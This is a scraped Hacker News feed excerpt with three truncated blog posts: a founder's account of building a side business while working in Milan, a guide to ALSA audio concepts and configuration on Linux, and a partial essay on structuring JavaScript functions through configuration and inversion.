Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581041">thread link</a>) | @Jetroid
<br/>
September 24, 2020 | https://www.alexwest.co/two_and_a_half_years | <a href="https://web.archive.org/web/*/https://www.alexwest.co/two_and_a_half_years">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>

        

        <h2><u>TL;DR (Too Lazy Didn't Read)</u> üìï</h2>

        

        <p>At last I did it! After more than two years of constant trial and error, I managed to build a successful, profitable product and achieve financial independence!</p>

        <p>In this blog post I will explain in detail what happened and how I went from no idea to $2k MRR with <a target="_blank" href="https://www.getcyberleads.com/">Cyberleads</a> inside six months.</p>

		<p>The story of I found a good B2B idea. How I launched it. How I found a good distribution channel and grew it. And how you can do it too.</p>

		<p>No bullshit. Straight up the real story. Moving abroad. Starting a full time job. Doubting myself. Crying. Finding Cyberleads. Launching it. Growing it. Everything.</p>

        <p>Ok, let‚Äôs do it. Let‚Äôs go back in time to the beginning of 2020.. January 4th‚Ä¶</p>


        

        

        <p>I‚Äôm getting off the plane. I‚Äôm in Milan, Italy. Going to get the bus to find the place I would call home for the next year. A little room, in a house with four Italian room mates I've never seen before in my life.</p>

        <p>The weather is perfect. I‚Äôm excited and nervous at the same time. I keep asking myself, ‚ÄúWhat the fuck am I doing here..‚Äù</p>

        <p>The reason I‚Äôm here is because of <a target="_blank" href="https://www.epilepsyblocker.com/">‚ÄúEpilepsy Blocker‚Äù</a>, a product I built in 2019. It's a chrome extension that protects people with photosensitive epilepsy while browsing the web.</p>

        <p>It managed to get the attention of the CEO of a big healthcare startup.</p>

        <p>That company builds life saving, FDA cleared medical devices for people with neurological conditions. Epilepsy also. Hence, the interest. He invited me for a Zoom chat, and we discussed for close to two hours.</p>

        <p>We talked about everything, and in our chat he explained what they do. He explained that they have offices in Boston, Milan and South Korea, and most importantly, that the door is open for me if I ever wanted to join.</p>

        <p>I learnt that they use AI and other cool technologies. That they work with organizations like NASA and MIT. That one of the founders is an MIT professor. That they offer fantastic perks and benefits. Free lunch every day. Free gym membership. Free weekly massages. Free MacBook Pro and gear. Summer offices in Sardinia. An international team full of young and interesting people. A great salary.</p>

        <p>But no matter how great the job, I wasn‚Äôt interested. Actually, I thought that there was a slight possibility they might buy EpilepsyBlocker. So, I was even disappointed.</p>

        <p>I can't work for a company! That's like selling your soul to the devil. No matter how cool the company is, it still felt like golden handcuffs to me.</p>

        <p>But I was running out of time. And I was going no where, as far as generating revenue is concerned. I had been building products non stop for two years, and was struggling at around $100/month.</p>

        <p>I was also finishing up uni at this point, and after that I would have to find a full time job. </p>

        <p>I mean.. you have to, right? You either study or you work. You can't fuck around on your laptop all day, pretending to be building businesses! That was my parents' mentality, anyway. And I had to respect it.</p>

        <p>This was definitely the best job I would ever land straight out of uni. Especially with my grades and credentials.</p>

        <p>And I also wanted a change. Moving abroad excited me.</p>

        <p>So I took it. I emailed them and told them would start in January 2020, after I get my degree. I had a few months, but I still didn't manage to build a successful product. No matter how hard I tried.</p>

        <p>I remember reading this quote:</p>

        <p><b><u>"When in doubt, do the exact opposite of what you are doing."</u></b></p>

        <br>

        
        

        <p>So here I am, I've arrived in my small bedroom in Milan, and I'm getting ready to go to "work" tomorrow. At the office. Like a proper grown up.</p>

        <p>I set my alarm clock for 07:00AM.</p>

        <p>I saw my jeans, white polo shirt and watch on my chair. My shoes nice and clean. All ready to be worn the next day. Ready to make me look professional.</p>

        <p>Fuck.. I'm an adult now.</p>

        <p>Only my closest friends and some members of my family know about this, but at that moment, I started crying like a child.</p>

        <p>I wasn't afraid that I was going to hate the job. The opposite, actually. I was afraid that I was going to love it and forget everything about my goals.</p>

        <p>I was afraid that in the blink of an eye, my life will be work during the week, and partying on the week ends. Before I know it, three years will have gone by and I'll still be at the same job. I will have forgotten everything about my goals and dreams. My side projects would seem like a very distant dream I can hardly even remember.</p>

        
        <p><i>"Oh, yeah. Back in the day when I used to build little side projects.. Cute."</i></p>
        

        <p>I promised I wouldn't stop working on my personal projects, no matter how tired I am.</p>

        <p>So, yeah.. Picture this.</p>

        <p>A grown ass man crying because he would start a comfy job. At twenty five years of age.</p>

        <p>It's pathetic. I know. But it's the truth. And in this blog post, you'll get nothing but the truth.</p>


        
        

        <p>Luckily, reality was different to my expectations.</p>

        <p>There were no NASA scientists at lunch break. I wasn't saving lives with my code on a casual Tuesday. And I definitely wasn't discussing about AI, side projects or making the world a better place with my colleagues.</p>

        <p>Welcome to reality!</p>

        <p>I was tucked in a corner, with my brand new laptop, programming an internal dashboard for the logistics team.</p>

        <p>Clocking in eight hours per day, plus one hour for lunch break.</p>

        <p>I would enter the building at 10:00 AM and leave at 19:00 PM. That was pitch dark in January/February.</p>

        <p>It was depressing. I wasn't getting close with my colleagues either. All our conversations were at surface level.</p>

        <p>Things were like I had predicted. I had daily fuel and motivation to change my life.</p>

        <p>Initially, I thought that something was wrong with me. That I'm a "special flower", who doesn't like working in an office.</p>

        <p>But no.</p>

        <p>One day, during lunch break, I overheard my colleagues talking about sleep. Somehow the conversation ended up in how lovely it is to lie down in bed on a Friday night. Knowing that you don't have to wake up early for the next two days. And how depressing Sundays are because you know you have to go to work the next day.</p>

        <p>"Ok, so I'm not the only one."</p>

        <p>I'm not the cancerous cell growing inside this company. And I'm not special.</p>

        <p>No one enjoys working on a desk for eight hours a day, five days a week. Week after week. Month after month. Year after year. Decade after decade. No matter how cool the company is or fulfilling it's mission is.</p>

        <p>Most people don't know you can actually escape. Or maybe they don't have the balls to try.</p>

        <p>All I needed was a plan..</p>

        

        

        <p>Hindsight 20-20, but three books I happened to read in December and January helped me shape my approach and strategy.</p>

        

        <p><u>- The Alchemist by Paulo Coelho</u></p>

        <p>This book was short, sweet, and easy to read. It's about a boy that has a dream and works hard for it.</p>

        <p>Bullshit, really. Just a bit of inspiration to keep going.</p>

        

        <p><u>- Atomic Habits</u></p>

        <p>The most practical book I've ever read. It explains how progress happens slowly, then all at once. All you have to do is focus on your inputs/habits and wait for the rewards.</p>

       	

        <p><u>- Millionaire Fastlane</u></p>

        <p>Please, for the love of god, ignore the title! It's cringe as fuck, and I have a really hard time recommending it for that reason. But, if you ignore the title and the first twenty pages of the book where he talks about chicks and lambos, you'll thank me. The principles in the book are timeless and very close to the indiehacking philosophy.</p>

        <p>Three concepts from this book really helped me solidify some raw ideas I had in my mind.</p>

        <p>They deserve chapters of their own.</p>

        


        

        <p>The first concept is that making your passion your job is dangerous.</p>

        <p>It can mix up your incentives and make you hate what you once loved.</p>

        <p>I had personal experience with this. Again, I'm getting dangerously transparent with what I'm about to say, but fuck it.</p>

        <p>I was looking at how many people have photosensitive epilepsy and remember being dissapointed that the market was small.</p>

        <p>Damn it. Couldn't I have built a solution for more people? Couldn't it have been a bigger market?</p>

        <p>I caught myself off guard. What the fuck. My incentives had started getting mixed up before I had even started.</p>

        <p>It's a wonderful thing that so few people have this. Not a negative.</p>

        <p>Now, EpilepsyBlocker is completely free, and always will be. I'm not trying to make it a business, and never will.</p>

        <p>So stop trying to build products that are your "passion". What you want is a business that gives you the freedom to explore your passions and hobbies, without having to worry about making money out of them.</p>

        

        

        <p>The second concept is that you don't have to be unique or try to change the world.</p>

        <p>Trying to change the external, the whole world around you, is a very naive way of thinking.</p>

        <p>What you want is to change your world first, and then the rest of the world.</p>

        <p>Actually, changing yourself is the best way to change the world anyway.</p>

        <p>Heck. If you are so keen like you say you are, do something more boring, make money, and donate like 50% of your income to charities, every month.</p>

        <p>What is better?</p>

        <p>Trying to build a romantic, cool, probably B2C idea to help humanity? Struggle to make a profit and build an average product at best?</p>

        <p>Or build a less romantic, profitable product? One that you enjoy working on? Build a stellar product, make a lot ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexwest.co/two_and_a_half_years">https://www.alexwest.co/two_and_a_half_years</a></em></p>]]>
            </description>
            <link>https://www.alexwest.co/two_and_a_half_years</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581041</guid>
            <pubDate>Thu, 24 Sep 2020 17:23:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ALSA, Exposed]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580892">thread link</a>) | @ashitlerferad
<br/>
September 24, 2020 | https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed | <a href="https://web.archive.org/web/*/https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The clearest ALSA documentation in the universe.</p><a name="alsa-exposed/a-short-essay" href="#alsa-exposed/a-short-essay"><h2><span><span>1</span></span><span>A short essay</span></h2></a><p>ALSA, one of the last great mysteries of Linux, is notoriously hard to use, mostly stemming from the atrocious (read: <strike>almost</strike> entirely nonexistent) end user documentation.</p><p>The internet is scattered with outdated, incorrect, incomplete, confused information written by monkeys at Linux terminals trying random ALSA configs in an attempt to get sound to come out. Being a representative of monkeys myself, I‚Äôve also spent days (that is, multiples of 24 hours) trying to get ALSA to behave sanely.</p><p>I finally jumped into the source, <code>strace</code>d, dug through configs, library documentation, searched my soul and now I‚Äôve cracked this banana! And it‚Äôs actually not bad. Here‚Äôs everything you need to know, once and for all.</p><a name="alsa-exposed/concepts" href="#alsa-exposed/concepts"><h2><span><span>2</span></span><span>Concepts</span></h2></a><a name="alsa-exposed/cards" href="#alsa-exposed/cards"><h3><span><span>2</span><span>1</span></span><span>Cards</span></h3></a><p>Any audio devices (audio chips, USB audio hardware) are considered <code>card</code>s in ALSA.</p><p><code>card</code>s have three identifiers:</p><ul><li><p>Number: This is a number starting from 0 based on the order the kernel found the device. This is useless, because it may be different each boot (and <em>will</em> be different each boot if you plug in and unplug things).</p><p>Edit: gen2brain notes you can control the number using <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6alrxx?utm_source=share&amp;utm_medium=web2x&amp;context=3">kernel module options</a></p></li><li><p>ID: This is a (hopefully unique and consistent) text identifier for a card. My built in device has the id <code>Generic</code>.</p></li><li><p>Name: This is another text identifier, but you can‚Äôt use it anywhere. Maybe it will help you identify the device or something‚Ä¶ but don‚Äôt count on it. My built in device has the name <code>HD-Audio Generic</code>.</p></li></ul><p>When referring to cards in config, programs, etc. you can use the number and ID interchangeably.</p><p>See <a href="#alsa-exposed/listing-your-devices">Listing your devices</a> for how to find the identifiers for devices on your system.</p><a name="alsa-exposed/devices" href="#alsa-exposed/devices"><h3><span><span>2</span><span>2</span></span><span>Devices</span></h3></a><p><code>device</code>s are subdivisions of a card. For example, my built in audio device has 3 <code>device</code>s: an analog input + output, a digital output (maybe HDMI?), and an alt analog input. I can configure the analog input and alt input on the device to be microphone-in or line-in independently.</p><p>Same as with <code>card</code>s, <code>device</code>s have three identifiers:</p><ul><li>Number</li><li>ID</li><li>Name</li></ul><p>Unlike the <code>card</code> number, <code>device</code> numbers are generally consistent so feel free to use them in configs and other places.</p><p>See <a href="#alsa-exposed/listing-your-devices">Listing your devices</a> for how to find the identifiers for devices on your system.</p><a name="alsa-exposed/subdevices" href="#alsa-exposed/subdevices"><h3><span><span>2</span><span>3</span></span><span>Subdevices</span></h3></a><p>Device has at least one subdevice. My subdevices are all called ‚Äúsubdevice 0‚Äù. By default subdevice 0 is used everywhere, so you can mostly not worry about this.</p><p>cathexis08 suggested multiple subdevices may be used to <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6hvdca?utm_source=share&amp;utm_medium=web2x&amp;context=3">subdivide surround sound systems into areas</a>.</p><a name="alsa-exposed/pcm-pulse-code-modulation" href="#alsa-exposed/pcm-pulse-code-modulation"><h3><span><span>2</span><span>4</span></span><span>PCM (Pulse Code Modulation)</span></h3></a><p>A PCM is an object <em>internal to ALSA</em> that processes audio. PCMs have a (direction) stream which can be playback, capture, or both. PCMs can be chained together, and typically connect to hardware at one end, although they can also be used to route audio to/from a filesystem device, a server, or to drop audio entirely.</p><p>Named PCMs definitions can be templatized, where arguments are provided when they‚Äôre referenced to dynamically define the PCM.  For instance, the built-in <code>hw</code> PCM takes 3 arguments: <code>"hw:CARD,DEVICE,SUBDEVICE"</code> (more details in <a href="#alsa-exposed/default-pcms-and-ctls">Default PCMs and CTLs</a>).</p><a name="alsa-exposed/ctl-control" href="#alsa-exposed/ctl-control"><h3><span><span>2</span><span>5</span></span><span>CTL (Control)</span></h3></a><p>A CTL is an object <em>internal to ALSA</em> processes non-audio data. This is what you see in your mixer: volume controls, toggle controls, multiple-choice selections (like when you can change a device to use different ports), etc.</p><p>You can save and load CTL values using the <code>alsactl</code> CLI and modify the values with <code>alsamixer</code> and other mixing software.</p><p>Like PCMs, CTL definitions can also be templatized.</p><a name="alsa-exposed/slave" href="#alsa-exposed/slave"><h3><span><span>2</span><span>6</span></span><span>Slave</span></h3></a><p>A slave wraps a PCM and allows you to set some audio stream details like bit rate. Generally a slave is just an extra step of indirection to PCM and contains no useful data itself.</p><a name="alsa-exposed/client" href="#alsa-exposed/client"><h3><span><span>2</span><span>7</span></span><span>Client</span></h3></a><p>A client is a piece of software that uses ALSA, via PCMs and CTLs.  Most clients use the default PCM/CTL, but some provide methods for explicitly selecting the PCM/CTL.</p><p>With <code>mpv</code> you can select a PCM named <code>hello</code> with <code>--audio-device=alsa/hello</code>, otherwise it will use the default PCM.  Templatized PCMs also work, like <code>--audio-device=alsa/hw:Generic</code>.</p><p>Similarly, if you have a CTL named <code>dog</code> you can change the levels with <code>alsamixer -D dog</code> (the help text uses the word device incorrectly) and, templatized, <code>alsamixer -D hw:Generic</code>.</p><a name="alsa-exposed/listing-your-devices" href="#alsa-exposed/listing-your-devices"><h2><span><span>3</span></span><span>Listing your devices</span></h2></a><a name="alsa-exposed/with-aplay-arecord" href="#alsa-exposed/with-aplay-arecord"><h3><span><span>3</span><span>1</span></span><span>With <code>aplay</code>/<code>arecord</code></span></h3></a><p>The easiest way to list devices is:</p><p><code>aplay -l
</code></p><p>or</p><p><code>arecord -l
</code></p><p>which produce output like this:</p><p><code>**** List of PLAYBACK Hardware Devices ****
card 1: Generic [HD-Audio Generic], device 0: ALC887-VD Analog [ALC887-VD Analog]
  Subdevices: 0/1
  Subdevice #0: subdevice #0
card 1: Generic [HD-Audio Generic], device 1: ALC887-VD Digital [ALC887-VD Digital]
  Subdevices: 1/1
  Subdevice #0: subdevice #0
</code></p><p>The format is:</p><p><code>card CARD_NUMBER: CARD_ID [CARD_NAME], device DEVICE_NUMBER: DEVICE_ID [DEVICE_NAME]
  ...
  Subdevice #SUBDEVICE_NUMBER: SUBDEVICE_NAME
</code></p><a name="alsa-exposed/from-proc" href="#alsa-exposed/from-proc"><h3><span><span>3</span><span>2</span></span><span>From <code>/proc</code></span></h3></a><p>Alternatively, you can go directly to the <code>/proc</code> tree.</p><a name="alsa-exposed/cards" href="#alsa-exposed/cards"><h4><span><span>3</span><span>2</span><span>1</span></span><span><code>card</code>s</span></h4></a><p>You can list <code>card</code>s with</p><p><code>cat /proc/asound/cards
</code></p><p>This produces output like:</p><p><code> 0 [USB            ]: USB-Audio - Realtek Audio USB
                      Generic Realtek Audio USB at usb-0000:03:00.0-6, high speed
 1 [Generic        ]: HDA-Intel - HD-Audio Generic
                      HD-Audio Generic at 0xf7800000 irq 53
</code></p><p>On the first line, <code>0</code> is the <code>card</code> number, <code>USB</code> (remove trailing spaces) is the <code>card</code> ID, <code>Realtek Audio USB</code> is the <code>card</code> name.  <code>USB-Audio</code> may be <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6hvdca?utm_source=share&amp;utm_medium=web2x&amp;context=3">related to the kernel driver</a> providing that device.</p><a name="alsa-exposed/devices" href="#alsa-exposed/devices"><h4><span><span>3</span><span>2</span><span>2</span></span><span><code>device</code>s</span></h4></a><p>Underneath <code>/proc/asound/cardNUMBER/</code> you‚Äôll see nodes like <code>pcm1c/</code> and <code>pcm2p/</code>. <code>1</code> and <code>2</code> are the <code>device</code> number and <code>p</code> or <code>c</code> stands for playback or capture.</p><p>Using my system as an example, <code>cat /proc/asound/card1/pcm0p/info</code> shows:</p><p><code>card: 1
device: 0
subdevice: 0
stream: PLAYBACK
id: ALC887-VD Analog
name: ALC887-VD Analog
subname: subdevice #0
class: 0
subclass: 0
subdevices_count: 1
subdevices_avail: 1
</code></p><a name="alsa-exposed/subdevices" href="#alsa-exposed/subdevices"><h4><span><span>3</span><span>2</span><span>3</span></span><span><code>subdevice</code>s</span></h4></a><p>Underneath <code>/proc/asound/card.../pcm.../</code> you‚Äôll see nodes like <code>sub0</code>, <code>sub1</code>.  <code>0</code> and <code>1</code> are the subdevice numbers.</p><p>In that directory, <code>cat</code> <code>info</code> and other nodes for details.</p><a name="alsa-exposed/configuring-alsa" href="#alsa-exposed/configuring-alsa"><h2><span><span>4</span></span><span>Configuring ALSA</span></h2></a><p>Each client loads <code>/usr/share/alsa/alsa.conf</code> at startup.</p><p>That config defines a number of other configs in <code>@hooks</code> which are all merged together, with later ones overriding earlier ones. On my system this pulls in:</p><ol start="1"><li><code>/etc/alsa.d/*.conf</code> in alphanumeric order</li><li><code>/etc/asound.conf</code></li><li><code>~/.asoundrc</code></li><li><code>~/.config/alsa/asoundrc</code></li></ol><p>If you change the config, you need to restart each ALSA client for the changes to take effect.</p><a name="alsa-exposed/configuration-syntax" href="#alsa-exposed/configuration-syntax"><h3><span><span>4</span><span>1</span></span><span>Configuration syntax</span></h3></a><p>The configuration is a tree, with top level keys:</p><ul><li>pcm</li><li>ctl</li><li>slave_pcm</li><li>timer</li><li>rawmidi</li><li>hwdep</li><li>‚Ä¶</li></ul><p>Each one is a dictionary with key value pairs of names and objects of the given type: <code>pcm</code> contains PCM definitions, <code>ctl</code> of CTL definitions, etc. <code>pcm</code> and <code>ctl</code> are expected to have a key <code>default</code> for clients that don‚Äôt explicitly choose one (most software).</p><p>The config file itself consists of multiple statements of the form:</p><p><code>KEY1.KEY2.KEY3... VALUE
</code></p><p><code>VALUE</code> can be a <code>"string"</code>, a number, a <code>compound</code> - a value that has multiple subproperties, or an absolute (top rooted) reference/alias to another value like <code>pcm.default</code>.</p><p>You can use <code>{</code> <code>}</code> with compounds to avoid writing the whole chain of keys in every statement:</p><p><code>pcm.a.b 4
pcm.a.c "hi"
</code></p><p>is equivalent to</p><p><code>pcm.a {
    b 4
    c "hi"
}
</code></p><p>This is also equivalent:</p><p><code>pcm.a {
    b 4
}
pcm.a {
    c "hi"
}
</code></p><p><code>;</code> and <code>,</code> end statements but they aren‚Äôt necessary. You can also put a <code>=</code> between the key and value if you really want to.</p><a name="alsa-exposed/assignment-modifiers" href="#alsa-exposed/assignment-modifiers"><h4><span><span>4</span><span>1</span><span>1</span></span><span>Assignment modifiers</span></h4></a><p>No values ‚Äúexist‚Äù until you set them in the config, even if there‚Äôs a default value.  Alsa uses knowledge of this ‚Äúexistance‚Äù to raise spurious when loading your config.</p><p>The errors are controlled by modifiers you can prefix on keys, like:</p><p><code>+a "hi"
</code></p><p>The four modifiers are:</p><ul><li><code>+
</code><p>(default if no modifier specified)</p><p>Creates the config value if it doesn‚Äôt exist, and sets it. No config values exist until you specify them, so this is purely determined by other config file statements.</p><p>If the value already exists, the new value must have the same type or else you‚Äôll get an error like:</p><code>ALSA lib conf.c:1446:(parse_def) KEY is not a TYPE
</code><p>For example, if you specify <code>pcm.default</code> instead of <code>pcm.!default</code> you‚Äôll probably see</p><code>ALSA lib conf.c:1446:(parse_def) default is not a compound
</code><p>since it‚Äôs already defined as an alias/reference, not a compound, in the generic packaged configurations.</p></li><li><code>-
</code><p>Sets the value, but doesn‚Äôt create it. If the value doesn‚Äôt exist and you try to set it with this, you‚Äôll get the error:</p><code>ALSA lib conf.c:1432:(parse_def) KEY does not exists
</code></li><li><code>?
</code><p>Only sets the value if it‚Äôs not already set. This is mostly used by package/distro maintainers that are providing default configurations.</p></li><li><code>!
</code><p>Creates, sets, and changes the type of the value.</p></li></ul><p><strong>TLDR</strong>: Just use the default until you get an error and then try <code>!</code>.</p><a name="alsa-exposed/special-statements-and-compounds" href="#alsa-exposed/special-statements-and-compounds"><h4><span><span>4</span><span>1</span><span>2</span></span><span>Special statements and compounds</span></h4></a><p>An <code>@</code> begins a special statement, like <code>@func</code> or <code>@args</code>.  How this works and the syntax seems to differ based on the symbol, so I won‚Äôt provide a general guide.</p><a name="alsa-exposed/arguments" href="#alsa-exposed/arguments"><h5><span><span>4</span><span>1</span><span>2</span><span>1</span></span><span>Arguments</span></h5></a><p>Named PCMs and CTLs can be parameterized to turn them into reusable templates.</p><p>For example, <code>slave.pcm "hw:Dog,5"</code> will instantiate the <code>pcm.hw</code> object as a template, where <code>Dog</code> is the first argument, <code>5</code> is the second, etc.</p><p>Arguments are specified with the special statement <code>@args</code> followed by <code>@arg.NAME</code> for each positional argument given name in the former. I don‚Äôt know the details on this, but you should be able to find examples in <code>/usr/share/alsa/alsa.conf</code> and other config files.</p><a name="alsa-exposed/environment-variables" href="#alsa-exposed/environment-variables"><h4><span><span>4</span><span>1</span><span>3</span></span><span>Environment variables</span></h4></a><p>A compound containing just <code>{ @func getenv vars [ ENVVAR1 ENVVAR2 ... ] default VALUE }</code> will turn into a string from the specified environment variable. Each environment variable is queried and the first to match is used, otherwise <code>VALUE</code>.</p><a name="alsa-exposed/pcm-config" href="#alsa-exposed/pcm-config"><h3><span><span>4</span><span>2</span></span><span>PCM config</span></h3></a><p>A named PCM config is defined as:</p><p><code>pcm.NAME {
    type TYPE
    ...
}
</code></p><p>and referred to like:</p><p><code>{
...
    playback.pcm "NAME"
...
}
</code></p><p>(via the <code>playback</code> slave field), or defined inline without a name like:</p><p><code>{
...
    playback.pcm {
        type TYPE
        ...
    }
...
}
</code></p><p>See more information in <a href="#alsa-exposed/slave-config">Slave config</a>.</p><p>All configuration parameters depend on <code>TYPE</code>. All types are documented with their ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed">https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed</a></em></p>]]>
            </description>
            <link>https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580892</guid>
            <pubDate>Thu, 24 Sep 2020 17:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crafting Functions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580885">thread link</a>) | @stopachka
<br/>
September 24, 2020 | https://stopa.io/post/251 | <a href="https://web.archive.org/web/*/https://stopa.io/post/251">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>We write so many functions in our programs that they become second nature before we know it. Like ants in a colony, they are numerous beyond imagination and they come together to form some surprisingly complex systems.</p><p>It begs the question: how do we write good functions? It can seem trivial: they√¢‚Ç¨‚Ñ¢re just like ants after-all. But there is leverage in the answer: the right decisions multiply throughout your codebase and bubble up into great design.</p><p>I think there are about three key ideas you can employ to craft good functions. I wanted to share them with you.</p><p>Let√¢‚Ç¨‚Ñ¢s start with an example. We have an app, and we want to export some data in a JSON format. Here√¢‚Ç¨‚Ñ¢s what a function for that could look like:</p><pre><code>function exportFile() { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const jsonStr = JSON.stringify(exportableData); // '{"data": {...
    const fileURL = saveFile("export.json", jsonStr); // https://foo.com/export.json
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Seems straight forward: To export as JSON, we first get our data. Now, this data may have some sensitive info, so we clean that up and transform into something exportable; ExportableData. Once we have that, we get a string representation, save the file, and badabing, badaboom, we√¢‚Ç¨‚Ñ¢re done. </p><p>Okay, we√¢‚Ç¨‚Ñ¢ve got something working well.</p><p>But life moves on and our program needs to evolve. Instead of just exporting JSON, we need to do more: <strong>we also need to export a CSV file</strong>. </p><p>How do we do that?</p><p>The first thing we notice, is that exporting a CSV is very similar to exporting JSON. Can we abstract <code>exportFile</code>?</p><p>One thing we can do, is to introduce a new flag: something like <code>exportFile(/*isCSV=*/ true)</code> </p><pre><code>function exportFile(isCSV) { 
  ...
  let fileURL
  if (isCSV) { 
    const csvStr = toCSVStr(exportableData)
    fileURL = saveFile("export.csv", jsonStr);
  } else { 
    const jsonStr = JSON.stringify(exportableData);
    fileURL = saveFile("export.json", jsonStr);
  }
  ...</code></pre><p>By introducing this flag, we can conditionally produce a different <code>fileURL</code>: one for CSV and one for JSON. With that we see the first concept for abstraction: configuration. You pass some configuration, and you leave it to your function to figure what to do. </p><p>So, is it a good idea? </p><h2>The key <em>advantage</em> is that our logic is centralized.</h2><p>With configuration, the caller is limited in what they can do: they can only provide flags. All the true logic stays inside <code>exportFile</code>. This means that callers of the function can√¢‚Ç¨‚Ñ¢t go crazy and do something unsupported. And that could give us some peace of mind.</p><h2>The key <em>disadvantage</em> is that√¢‚Ç¨¬¶our logic is centralized.</h2><p>This will work, but let√¢‚Ç¨‚Ñ¢s think about it. First, notice that in order to understand <code>exportFile</code> now, we need to understand both the CSV and JSON case. Imagine if someone opens up <code>exportFile</code> to figure out what it does:  if they <em>only</em> cared about JSON, they now have to understand more logic than they needed. Anyone who changes the logic for CSV, may also end up breaking JSON. <code>**exportFile**</code> <strong>has become</strong> <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank"><strong>complected</strong></a><strong>.</strong></p><p>Notice also, that because the caller of this function can <em>only</em> provide flags, their hands are tied for use-cases that you didn√¢‚Ç¨‚Ñ¢t support. This was supposed to give you peace of mind, but it certainly can frustrate callers. imagine if they wanted to support XML, what could they do? They√¢‚Ç¨‚Ñ¢d have to edit <code>exportFile</code> to support this case. (God forbid they edit it to be something like <code>exportFile(isCSV, isXML)</code> √¢‚Ç¨‚Äù now you have invariant conditions on your hands). By being so specific, you√¢‚Ç¨‚Ñ¢ve chosen to make your function less abstract √¢‚Ç¨‚Äù this of course means that it is less powerful.  <code>**exportFile**</code> <strong>has become hard to extend</strong></p><h2>For better or worse, configuration gives the caller the least amount of power</h2><p>If you imagine a sort power spectrum, where the caller has the least power on the left, and most power on the right, configuration would be on the left. You control what the caller does so tightly that it gives your certainty, but makes your function more complex and less useful. </p><p>Say you wanted to address the problems, and move to the right of this spectrum, what could you do? </p><p>Well, if you look at what we wrote, we can notice that the only part that is <em>really</em> different, is the bit about taking <code>exportData</code>, and creating a <code>fileURL</code>. </p><pre><code>...
const exportableData = toExportableData(data); // ExportableData
... // *This can be different! Somehow we need to get a fileURL* 
setFileURL(fileURL);
...</code></pre><p>So one thing we can do is this: instead of providing a flag, we can provide a function: </p><pre><code>function exportFile(exportableDataToFileURL) { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const fileURL = exportableDataToFileURL(exportableData)
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Now, for JSON, we can write </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.json", JSON.stringify(exportableData));
})</code></pre><p>and for CSV we can write: </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.csv", toCSVStr(exportableData));
})</code></pre><p>Oky doke, this is cool. </p><h2>The key <em>advantage</em> is that you give the caller more power</h2><p>With this we solve both of the problems we had with configuration. Now if someone looks under the hood at <code>exportFile</code>, they won√¢‚Ç¨‚Ñ¢t see unrelated code about csv. If they wanted to extend to XML, they can simply provide a different function. We√¢‚Ç¨‚Ñ¢ve given the caller much more power</p><h2>The key <em>disadvantage</em> is that it can be either too powerful or not powerful enough</h2><p>We√¢‚Ç¨‚Ñ¢ve abstracted further, but there is a price there. The first is, that we <em>think</em> we know that what we <em>really</em> need to pass outwards is <code>exportableData</code>, and what we need to return is a <code>fileURL</code>. What if we were wrong? For example, some may need a slightly different data format √¢‚Ç¨‚Äù instead of <code>exportableData</code> they need <code>someOtherKindOfExportableData</code>. By the time we figured that out, it√¢‚Ç¨‚Ñ¢s possible that there are numerous new usages of <code>exportFile</code>, which we√¢‚Ç¨‚Ñ¢ll have to support as we evolve this function.</p><p>One way we could have prevented this, is to have stuck with configuration. This way, anyone who wanted to support something would have to funnel through this function, which would give us time to think about what the best abstraction was. </p><p>Another way, would have been if this function was abstracted even further, so callers could have easily supported <code>someOtherKindOfExportableData</code>.</p><h2>Inversion lies in the middle of the power spectrum</h2><p>Inversion is more powerful than configuration, but it√¢‚Ç¨‚Ñ¢s not the most powerful method. This can be a great choice, but you risk either being too powerful and exposing errors, or not being powerful enough and restricting callers. </p><p>We know the less powerful option: configuration. What would the most powerful one look like?</p><p>The next thing we may notice, is that our <code>exportFile</code> function is actually built up some building blocks that could be useful for a bunch of different things. For example, many functions may want a loading state, or just need to get <code>exportableData</code>, etc. We could create those building blocks:</p><pre><code>function exportJSONFile() { 
  withLoading(() =&gt; saveJSONFile(getExportableData()))
}


function exportCSVFile() { 
  withLoading(() =&gt; saveCSVFile(getExportableData()))
